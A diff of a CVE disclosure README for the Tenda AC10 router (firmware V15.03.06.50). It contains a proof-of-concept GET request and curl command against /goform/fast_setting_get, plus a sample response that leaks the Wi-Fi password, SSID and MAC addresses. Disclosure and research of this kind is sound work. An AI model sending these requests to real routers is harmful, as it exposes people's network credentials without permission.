@@ -1,14 +1,14 @@
 # IOT-CVE
 
-Details
---------
+# Details
+
 
 An issue was discovered on Tenda AC1200 MV-MIMO Dual Band GB wifi Router (AC-10)  devices with firmware V15.03.06.50_multi. Privilege escalation
 vulnerability in /goform/fast_setting_get allows attackers to enumrate and get Routers Default Information (ssid, password, devicemac, defmac, adsluser, adslpassword)  on the system via a crafted post request.
 
 
-Poc
----
+# Poc
+
 GET /goform/fast_setting_get?0.7024619795874003 HTTP/1.1
 Host: 192.168.0.1
 Accept: application/json, text/javascript, */*; q=0.01
@@ -29,18 +29,18 @@ curl -i -s -k -X $'GET' \
 
 
 
-Response
----------
+# Response
+
 
 HTTP/1.1 200 OK
 Content-type: text/plain; charset=utf-8
 Pragma: no-cache
 Cache-Control: no-cache
 
-
+'''
 {"line":0,"wanType":-1,"net":0,"outType":1,"timeout":"0","lanIp":"192.168.0.1","lanMask":"255.255.255.0","adslUser":"","adslPwd":"","ssid":"Tenda_B38C40","wrlPassword":"DEFAULTPASSWORD","country":"US","power":"high","cloneType":"0","mac":"","deviceMac":"RETACTED","defMac":"RETACTED"}
+'''
 
-
-Acknowledgment
+## Acknowledgment
 
 Pankaj Kumar Thakur (@nep_1337_1998) from Nepal
